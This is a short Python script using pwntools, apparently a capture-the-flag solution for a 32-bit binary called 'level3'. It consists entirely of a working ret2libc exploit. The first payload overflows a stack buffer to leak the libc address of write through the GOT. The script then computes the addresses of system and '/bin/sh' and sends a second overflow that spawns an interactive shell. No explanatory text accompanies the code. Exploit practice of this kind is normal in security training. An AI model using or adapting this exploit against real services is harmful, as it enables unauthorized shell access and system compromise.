from pwn import *
#context.log_level = 'debug'
io = process('./level3')
#io = gdb.debug('./level3','break main')
elf = ELF('./level3')
Lib = ELF('/lib/i386-linux-gnu/libc.so.6')
payload1 = b'A'*(0x88+0x4)+p32(elf.plt['write'])+p32(elf.sym['main'])+p32(1)+p32(elf.got['write'])+p32(4)
io.sendline(payload1)
io.recvuntil('Input:\n')
write_addr = u32(io.recv(4))
print('write_addr->',hex(write_addr))

baseoffset = write_addr - Lib.sym['write']
sys_addr = baseoffset + Lib.sym['system']
bin_sh_addr = baseoffset + next(Lib.search(b'/bin/sh'))
payload2 = b'A'*(0x88+0x4)+p32(sys_addr)+p32(0xdeadbeef)+p32(bin_sh_addr)
io.sendlineafter(b'Input:\n',payload2)
io.interactive()
